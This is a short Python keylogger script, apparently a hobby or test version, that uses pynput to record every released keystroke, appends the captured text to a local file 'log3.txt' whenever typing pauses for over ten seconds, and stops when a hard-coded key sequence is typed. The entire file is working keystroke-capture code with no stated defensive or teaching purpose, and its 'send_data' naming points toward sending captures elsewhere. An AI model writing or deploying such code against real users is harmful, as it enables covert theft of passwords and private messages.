from pynput.keyboard import Listener, Key
from collections import deque
import timeit

conteudo = ""
time_i = 0
time_o = 0
password = ["1", "q", "Key.space", "'", "."]
keys = deque(maxlen=5)

def log(text):
    global conteudo
    conteudo += text
    time_monitor()

def time_monitor():
    global time_i
    global time_o
    time_o = time_i
    time_i = timeit.default_timer()
    if time_i - time_o > 10:
        print("enviou")
        send_data()
    print(time_i)

def send_data():
    with open("log3.txt", "a") as file_log:
        file_log.write(conteudo)

def monitor(key):
    try:
        log(str(key.char))
        keys.append(key.char)
    except AttributeError:
        #log(" <" + str(key) + "> ")
        if str(key) == "Key.space":
            log(" ")
        keys.append(str(key))
    if "".join(password) == "".join(keys):
        print(conteudo)
        return False

with Listener(on_release=monitor) as listener:
    listener.join()